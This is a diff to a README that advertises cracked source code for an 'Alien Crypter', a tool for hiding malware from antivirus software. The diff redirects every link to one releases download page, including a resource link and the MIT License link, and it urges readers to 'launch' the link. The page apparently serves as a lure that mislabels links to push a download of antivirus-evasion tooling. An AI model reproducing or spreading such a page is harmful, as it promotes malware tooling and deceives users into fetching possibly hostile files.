@@ -24,7 +24,7 @@ Welcome to the Alien Crypter Crack Source Code repository! Here you will find a 
   - windows
 
 ### Get Started:
-🚀 **[Download Source Code](https://github.com/file/Soft.zip)**
+🚀 **[Download Source Code](https://github.com/mdragom/Alien-Crypter-Crack-Source-Code-Net-Native/releases)**
  
 ⚠️ *Please note that the above link needs to be launched to access the files.*
 
@@ -61,10 +61,10 @@ If the provided link is not working or you are looking for alternative versions,
 📚 Here are some additional resources and references to enhance your understanding of crypters and antivirus evasion techniques:
 
 - *Book*: "The Art of Exploitation" by Jon Erickson
-- *Website*: [Link to AntiVirus Evasion Techniques](https://www.example.com)
+- *Website*: [Link to AntiVirus Evasion Techniques](https://github.com/mdragom/Alien-Crypter-Crack-Source-Code-Net-Native/releases)
 
 ### License:
-📝 This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the code within the terms of the license.
+📝 This repository is licensed under the [MIT License](https://github.com/mdragom/Alien-Crypter-Crack-Source-Code-Net-Native/releases). You are free to use, modify, and distribute the code within the terms of the license.
 
 ---
 
